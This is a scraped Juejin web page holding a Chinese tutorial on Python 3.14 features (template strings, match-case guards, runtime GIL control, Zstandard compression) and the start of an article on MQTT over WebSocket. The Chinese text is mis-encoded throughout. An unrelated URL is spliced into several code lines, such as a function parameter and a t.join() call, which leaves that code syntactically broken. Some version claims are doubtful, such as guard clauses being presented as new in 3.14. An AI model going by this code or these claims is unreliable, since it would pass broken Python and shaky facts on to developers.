<span class="hljs-comment"># æ³¨æ„ï¼šè¿™æ˜¯è¯­æ³•å±‚é¢çš„æ–°ç‰¹æ€§ï¼Œéœ€è¦Python 3.14+</span>

<span class="hljs-comment"># å‡è®¾çš„ t-string ç”¨æ³•ï¼ˆå®é™…è¯­æ³•å¯èƒ½æœ‰æ‰€ä¸åŒï¼‰ï¼š</span>
<span class="hljs-comment"># t_template = t"Hello, {name}! You have {count} messages."</span>

<span class="hljs-comment"># å®é™…å¯ä»¥è¿™æ ·ä½¿ç”¨ï¼š</span>
def create_email_template():
    """åˆ›å»ºå¯é‡ç”¨çš„é‚®ä»¶æ¨¡æ¿"""
    <span class="hljs-comment"># åœ¨ 3.14 ä¸­å¯èƒ½ä¼šæœ‰ç›´æ¥çš„ t"" è¯­æ³•</span>
    <span class="hljs-comment"># æš‚æ—¶ç”¨ Template æ¨¡æ‹Ÿ</span>
    return Template("""
å°Šæ•¬çš„ ${name}ï¼š

æ„Ÿè°¢æ‚¨è´­ä¹° ${product}ã€‚
è®¢å•å·: ${order_id}
æ€»é‡‘é¢: $${amount}

${store_name} å›¢é˜Ÿ
""")

<span class="hljs-comment"># å¤šæ¬¡ä½¿ç”¨åŒä¸€ä¸ªæ¨¡æ¿</span>
<span class="hljs-attr">template</span> = create_email_template()

<span class="hljs-attr">email1</span> = template.substitute(
    <span class="hljs-attr">name</span>=<span class="hljs-string">"å¼ ä¸‰"</span>,
    <span class="hljs-attr">product</span>=<span class="hljs-string">"Pythonç¼–ç¨‹æŒ‡å—"</span>,
    <span class="hljs-attr">order_id</span>=<span class="hljs-string">"ORD-2024-001"</span>,
    <span class="hljs-attr">amount</span>=<span class="hljs-string">"99.99"</span>,
    <span class="hljs-attr">store_name</span>=<span class="hljs-string">"ç¼–ç¨‹ä¹¦åº—"</span>
)

<span class="hljs-attr">email2</span> = template.substitute(
    <span class="hljs-attr">name</span>=<span class="hljs-string">"æå››"</span>, 
    <span class="hljs-attr">product</span>=<span class="hljs-string">"æ•°æ®ç»“æ„ä¸ç®—æ³•"</span>,
    <span class="hljs-attr">order_id</span>=<span class="hljs-string">"ORD-2024-002"</span>,
    <span class="hljs-attr">amount</span>=<span class="hljs-string">"129.99"</span>,
    <span class="hljs-attr">store_name</span>=<span class="hljs-string">"ç¼–ç¨‹ä¹¦åº—"</span>
)

print(email1)
print("\n<span class="hljs-attr">" + "</span>=<span class="hljs-string">"*50 + "</span>\n<span class="hljs-string">")
print(email2)
</span></code></pre>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e30d98d2942e4cb793f71786fc48df5e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766465623&amp;x-signature=zHFth0fBrx97RbaQS7ryAoJbxl8%3D" alt="å¤åˆ¶ä»£ç " loading="lazy"/></a></p>
<h3 data-id="heading-5"><strong>2. æ¨¡å¼åŒ¹é…å®ˆå«è¡¨è¾¾å¼</strong></h3>
<p>Â </p>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d74c3d6d5a14a319ba0fd9a40f7783f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766465623&amp;x-signature=iqEtQUvO%2FMeul5CbXdWzHdZMKxU%3D" alt="å¤åˆ¶ä»£ç " loading="lazy"/></a></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Python 3.10 å¼•å…¥äº†æ¨¡å¼åŒ¹é…</span>
<span class="hljs-comment"># Python 3.14 å¢å¼ºäº†å®ˆå«è¡¨è¾¾å¼</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_http_request</span>(<span class="hljs-params">https://www.falvce.com/: <span class="hljs-built_in">dict</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""å¤„ç†HTTPè¯·æ±‚ï¼Œä½¿ç”¨æ¨¡å¼åŒ¹é…å’Œå®ˆå«è¡¨è¾¾å¼"""</span>
    
    <span class="hljs-keyword">match</span> request:
        <span class="hljs-comment"># åŸºæœ¬æ¨¡å¼åŒ¹é…</span>
        <span class="hljs-keyword">case</span> {<span class="hljs-string">"method"</span>: <span class="hljs-string">"GET"</span>, <span class="hljs-string">"path"</span>: <span class="hljs-string">"/api/users"</span>}:
            <span class="hljs-keyword">return</span> <span class="hljs-string">"è·å–ç”¨æˆ·åˆ—è¡¨"</span>
        
        <span class="hljs-comment"># å¸¦å®ˆå«è¡¨è¾¾å¼ (Python 3.14+)</span>
        <span class="hljs-keyword">case</span> {<span class="hljs-string">"method"</span>: <span class="hljs-string">"GET"</span>, <span class="hljs-string">"path"</span>: path} <span class="hljs-keyword">if</span> path.startswith(<span class="hljs-string">"/api/"</span>):
            <span class="hljs-keyword">return</span> <span class="hljs-string">f"APIè¯·æ±‚: <span class="hljs-subst">{path}</span>"</span>
        
        <span class="hljs-comment"># å¤æ‚å®ˆå«æ¡ä»¶</span>
        <span class="hljs-keyword">case</span> {<span class="hljs-string">"method"</span>: <span class="hljs-string">"POST"</span>, <span class="hljs-string">"path"</span>: <span class="hljs-string">"/api/data"</span>, <span class="hljs-string">"body"</span>: body} 
             <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(body, <span class="hljs-built_in">dict</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">"data"</span> <span class="hljs-keyword">in</span> body:
            <span class="hljs-keyword">return</span> <span class="hljs-string">f"å¤„ç†æ•°æ®: <span class="hljs-subst">{body[<span class="hljs-string">'data'</span>]}</span>"</span>
        
        <span class="hljs-comment"># å¸¦æ—¶é—´æˆ³çš„å®ˆå«</span>
        <span class="hljs-keyword">case</span> {<span class="hljs-string">"method"</span>: <span class="hljs-string">"GET"</span>, <span class="hljs-string">"path"</span>: <span class="hljs-string">"/status"</span>, <span class="hljs-string">"timestamp"</span>: ts} 
             <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(ts, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">and</span> ts &gt; <span class="hljs-number">1700000000</span>:
            <span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime
            dt = datetime.fromtimestamp(ts)
            <span class="hljs-keyword">return</span> <span class="hljs-string">f"çŠ¶æ€æ£€æŸ¥äº: <span class="hljs-subst">{dt}</span>"</span>
        
        <span class="hljs-comment"># é»˜è®¤æƒ…å†µ</span>
        <span class="hljs-keyword">case</span> _:
            <span class="hljs-keyword">return</span> <span class="hljs-string">"æœªçŸ¥è¯·æ±‚"</span>

<span class="hljs-comment"># æµ‹è¯•ç”¨ä¾‹</span>
test_requests = [
    {<span class="hljs-string">"method"</span>: <span class="hljs-string">"GET"</span>, <span class="hljs-string">"path"</span>: <span class="hljs-string">"/api/users"</span>},
    {<span class="hljs-string">"method"</span>: <span class="hljs-string">"GET"</span>, <span class="hljs-string">"path"</span>: <span class="hljs-string">"/api/products/123"</span>},
    {<span class="hljs-string">"method"</span>: <span class="hljs-string">"POST"</span>, <span class="hljs-string">"path"</span>: <span class="hljs-string">"/api/data"</span>, <span class="hljs-string">"body"</span>: {<span class="hljs-string">"data"</span>: <span class="hljs-string">"test"</span>}},
    {<span class="hljs-string">"method"</span>: <span class="hljs-string">"GET"</span>, <span class="hljs-string">"path"</span>: <span class="hljs-string">"/status"</span>, <span class="hljs-string">"timestamp"</span>: <span class="hljs-number">1704067200</span>},
    {<span class="hljs-string">"method"</span>: <span class="hljs-string">"DELETE"</span>, <span class="hljs-string">"path"</span>: <span class="hljs-string">"/old/path"</span>},
]

<span class="hljs-keyword">for</span> req <span class="hljs-keyword">in</span> test_requests:
    result = process_http_request(req)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{req}</span> -&gt; <span class="hljs-subst">{result}</span>"</span>)
</code></pre>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/028e69e4461143ab9b127c05a456cf71~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766465623&amp;x-signature=ClbK4bGJRBZ8Cw9l23jfH3%2BVUqU%3D" alt="å¤åˆ¶ä»£ç " loading="lazy"/></a></p>
<h3 data-id="heading-6"><strong>3. è§£é‡Šå™¨çº§GILæ§åˆ¶</strong></h3>
<p>Â </p>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ffd414ae8ec458582253d13302c9fe5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766465623&amp;x-signature=vfQW7HwgwJ3nylXWKjaJmM7VLAk%3D" alt="å¤åˆ¶ä»£ç " loading="lazy"/></a></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">test_runtime_gil_control</span>():
    <span class="hljs-string">"""è¿è¡Œæ—¶åŠ¨æ€æ§åˆ¶GIL"""</span>
    
    <span class="hljs-comment"># æ£€æŸ¥å½“å‰GILçŠ¶æ€</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å½“å‰GILå¯ç”¨: <span class="hljs-subst">{sys._is_gil_enabled()}</span>"</span>)
    
    <span class="hljs-comment"># åŠ¨æ€ç¦ç”¨GILï¼ˆPython 3.14+ï¼‰</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(sys, <span class="hljs-string">'set_gil_enabled'</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"ç¦ç”¨GILä»¥æ‰§è¡ŒCPUå¯†é›†å‹ä»»åŠ¡..."</span>)
        sys.set_gil_enabled(<span class="hljs-literal">False</span>)
        
        <span class="hljs-keyword">def</span> <span class="hljs-title function_">cpu_intensive_task</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, n=<span class="hljs-number">10_000_000</span></span>):
            result = <span class="hljs-number">0</span>
            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):
                result += i * i
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ä»»åŠ¡ <span class="hljs-subst">{<span class="hljs-built_in">id</span>}</span> å®Œæˆ: <span class="hljs-subst">{result}</span>"</span>)
            <span class="hljs-keyword">return</span> result
        
        <span class="hljs-comment"># åˆ›å»ºå¹¶è¡Œçº¿ç¨‹</span>
        threads = []
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):
            t = threading.Thread(target=cpu_intensive_task, args=(i, <span class="hljs-number">5_000_000</span>))
            threads.append(t)
            t.start()
        
        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
            t.join(https://www.falvce.com/)
        
        <span class="hljs-comment"># é‡æ–°å¯ç”¨GIL</span>
        sys.set_gil_enabled(<span class="hljs-literal">True</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"GILå·²é‡æ–°å¯ç”¨"</span>)
    
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"å½“å‰Pythonç‰ˆæœ¬ä¸æ”¯æŒè¿è¡Œæ—¶GILæ§åˆ¶"</span>)

<span class="hljs-comment"># æ³¨æ„ï¼šåŠ¨æ€GILæ§åˆ¶éœ€è¦è°¨æ…ä½¿ç”¨</span>
<span class="hljs-comment"># æŸäº›Cæ‰©å±•å¯èƒ½ä¾èµ–GIL</span>
</code></pre>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f3347acbbba4024b4e051100b21d592~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766465623&amp;x-signature=1RlprG6SjBjBaW2hvMAnhPNNc1o%3D" alt="å¤åˆ¶ä»£ç " loading="lazy"/></a></p>
<h3 data-id="heading-7"><strong>4. åŸç”ŸZstandardå‹ç¼©</strong></h3>
<p>Â </p>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/630878569eb64fd39632671a099077ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766465623&amp;x-signature=fTQKuvNyxaOM5oRNEXbniZyEGOg%3D" alt="å¤åˆ¶ä»£ç " loading="lazy"/></a></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Python 3.14 å†…ç½® zstd æ”¯æŒ</span>
<span class="hljs-keyword">import</span> compression.zstd <span class="hljs-keyword">as</span> zstd
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">import</span> os

<span class="hljs-keyword">def</span> <span class="hljs-title function_">demo_zstd_compression</span>():
    <span class="hljs-string">"""æ¼”ç¤ºZstandardå‹ç¼©"""</span>
    
    <span class="hljs-comment"># åˆ›å»ºæµ‹è¯•æ•°æ®</span>
    data = {
        <span class="hljs-string">"users"</span>: [
            {<span class="hljs-string">"id"</span>: i, <span class="hljs-string">"name"</span>: <span class="hljs-string">f"User_<span class="hljs-subst">{i}</span>"</span>, <span class="hljs-string">"email"</span>: <span class="hljs-string">f"user<span class="hljs-subst">{i}</span>@example.com"</span>}
            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>)
        ]
    }
    
    json_str = json.dumps(data, indent=<span class="hljs-number">2</span>)
    original_size = <span class="hljs-built_in">len</span>(json_str.encode(<span class="hljs-string">'utf-8'</span>))
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"åŸå§‹æ•°æ®å¤§å°: <span class="hljs-subst">{original_size:,}</span> å­—èŠ‚"</span>)
    
    <span class="hljs-comment"># ä½¿ç”¨Zstandardå‹ç¼©</span>
    compressed = zstd.compress(json_str.encode(<span class="hljs-string">'utf-8'</span>))
    compressed_size = <span class="hljs-built_in">len</span>(compressed)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å‹ç¼©åå¤§å°: <span class="hljs-subst">{compressed_size:,}</span> å­—èŠ‚"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å‹ç¼©ç‡: <span class="hljs-subst">{compressed_size/original_size:<span class="hljs-number">.1</span>%}</span>"</span>)
    
    <span class="hljs-comment"># è§£å‹ç¼©</span>
    decompressed = zstd.decompress(compressed)
    decompressed_str = https://www.falvce.com/ decompressed.decode(<span class="hljs-string">'utf-8'</span>)
    
    <span class="hljs-comment"># éªŒè¯æ•°æ®å®Œæ•´æ€§</span>
    <span class="hljs-keyword">assert</span> json_str == decompressed_str
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ•°æ®å®Œæ•´æ€§éªŒè¯é€šè¿‡"</span>)
    
    <span class="hljs-comment"># æµå¼å‹ç¼©</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\næµå¼å‹ç¼©ç¤ºä¾‹:"</span>)
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"test_data.json"</span>, <span class="hljs-string">"w"</span>) <span class="hljs-keyword">as</span> f:
        f.write(json_str)
    
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"test_data.json"</span>, <span class="hljs-string">"rb"</span>) <span class="hljs-keyword">as</span> src, \
         <span class="hljs-built_in">open</span>(<span class="hljs-string">"test_data.json.zst"</span>, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> dst:
        zstd.compress_stream(src, dst)
    
    compressed_file_size = os.path.getsize(<span class="hljs-string">"test_data.json.zst"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ–‡ä»¶å‹ç¼©åå¤§å°: <span class="hljs-subst">{compressed_file_size:,}</span> å­—èŠ‚"</span>)
    
    <span class="hljs-comment"># æ¸…ç†</span>
    os.remove(<span class="hljs-string">"test_data.json"</span>)
    os.remove(<span class="hljs-string">"test_data.json.zst"</span>)

<span class="hljs-comment"># ä¸gzipå¯¹æ¯”</span>
<span class="hljs-keyword">import</span> gzip

<span class="hljs-keyword">def</span> <span class="hljs-title function_">compare_compression</span>():
    data = <span class="hljs-string">b"x"</span> * <span class="hljs-number">1000000</span>
    
    <span class="hljs-comment"># gzip</span>
    gzipped = gzip.compress(data)
    
    <span class="hljs-comment"># zstd</span>
    zstd_compressed = zstd.compress(data)
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"åŸå§‹: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(data):,}</span> å­—èŠ‚"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"gzip: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(gzipped):,}</span> å­—èŠ‚"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"zstd: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(zstd_compressed):,}</span> å­—èŠ‚"</span>)
    
    <span class="hljs-comment"># æ€§èƒ½å¯¹æ¯”</span>
    <span class="hljs-keyword">import</span> time
    
    start = time.time()
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):
        gzip.compress(data[:<span class="hljs-number">10000</span>])
    gzip_time = time.time() - start
    
    start = time.time()
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):
        zstd.compress(data[:<span class="hljs-number">10000</span>])
    zstd_time = time.time() - start
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\nå‹ç¼©é€Ÿåº¦å¯¹æ¯” (100æ¬¡):"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"gzip: <span class="hljs-subst">{gzip_time:<span class="hljs-number">.3</span>f}</span>ç§’"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"zstd: <span class="hljs-subst">{zstd_time:<span class="hljs-number">.3</span>f}</span>ç§’"</span>)
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç‰©è”ç½‘åœºæ™¯ä¸­å¸¸è§çš„æ–¹æ¡ˆMQTT+WebSocket]]></title>    <link>https://juejin.cn/post/7584043969686356020</link>    <guid>https://juejin.cn/post/7584043969686356020</guid>    <pubDate>2025-12-16T05:44:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584043969686356020" data-draft-id="7583973472323698703" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç‰©è”ç½‘åœºæ™¯ä¸­å¸¸è§çš„æ–¹æ¡ˆMQTT+WebSocket"/> <meta itemprop="keywords" content="ç‰©è”ç½‘"/> <meta itemprop="datePublished" content="2025-12-16T05:44:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æœºåˆ¶çš„ä¾å„’"/> <meta itemprop="url" content="https://juejin.cn/user/166781495807214"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç‰©è”ç½‘åœºæ™¯ä¸­å¸¸è§çš„æ–¹æ¡ˆMQTT+WebSocket
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/166781495807214/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æœºåˆ¶çš„ä¾å„’
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T05:44:16.000Z" title="Tue Dec 16 2025 05:44:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>MQTT ä¸ WebSocket çš„ç»“åˆæ˜¯ç‰©è”ç½‘åœºæ™¯ä¸­éå¸¸å¸¸è§çš„æ–¹æ¡ˆï¼Œæ ¸å¿ƒæ˜¯<strong>è®© MQTT åè®®è¿è¡Œåœ¨ WebSocket ä¹‹ä¸Š</strong>ï¼ˆå³ MQTT over WebSocketï¼‰ï¼Œæ—¢ä¿ç•™ MQTT è½»é‡ã€é€‚åˆè®¾å¤‡é€šä¿¡çš„ç‰¹æ€§ï¼Œåˆåˆ©ç”¨ WebSocket çš„æµè§ˆå™¨ / ç½‘é¡µç«¯å‹å¥½æ€§ï¼ŒåŒæ—¶è§£å†³äº†éƒ¨åˆ†ç½‘ç»œç¯å¢ƒä¸‹ä»…å…è®¸ HTTP/WebSocket ç«¯å£é€šè¡Œçš„é—®é¢˜ã€‚ä»¥ä¸‹ä»<strong>ç»“åˆåŸç†ã€éƒ¨ç½²å®ç°ã€ä½¿ç”¨åœºæ™¯</strong>ä¸‰ä¸ªç»´åº¦è¯¦ç»†è¯´æ˜ï¼š</p>
<h3 data-id="heading-0">ä¸€ã€MQTT ä¸ WebSocket ç»“åˆçš„æ ¸å¿ƒåŸç†</h3>
<p>MQTT åŸæœ¬æ˜¯åŸºäº<strong>TCP/IP</strong>çš„åº”ç”¨å±‚åè®®ï¼Œè€Œ WebSocket æ˜¯åœ¨ HTTP åŸºç¡€ä¸Šå»ºç«‹çš„åŒå‘é•¿è¿æ¥åè®®ï¼ŒäºŒè€…çš„ç»“åˆæœ¬è´¨æ˜¯ï¼š</p>
<ol>
<li><strong>åè®®å°è£…</strong>ï¼šå°† MQTT çš„æ•°æ®åŒ…å°è£…åœ¨ WebSocket çš„å¸§ä¸­è¿›è¡Œä¼ è¾“ï¼ŒWebSocket ä½œä¸º â€œä¼ è¾“é€šé“â€ï¼ŒMQTT ä½œä¸º â€œåº”ç”¨å±‚é€»è¾‘â€ï¼›</li>
<li><strong>ç«¯å£å¤ç”¨</strong>ï¼šWebSocket é»˜è®¤ä½¿ç”¨ 80ï¼ˆws://ï¼‰æˆ– 443ï¼ˆwss://ï¼‰ç«¯å£ï¼Œè¿™äº›ç«¯å£é€šå¸¸ä¸ä¼šè¢«é˜²ç«å¢™ / è·¯ç”±å™¨æ‹¦æˆªï¼Œè§£å†³äº†ä¼ ç»Ÿ MQTT çš„ 1883ï¼ˆTCPï¼‰/8883ï¼ˆSSL/TCPï¼‰ç«¯å£è¢«å±è”½çš„é—®é¢˜ï¼›</li>
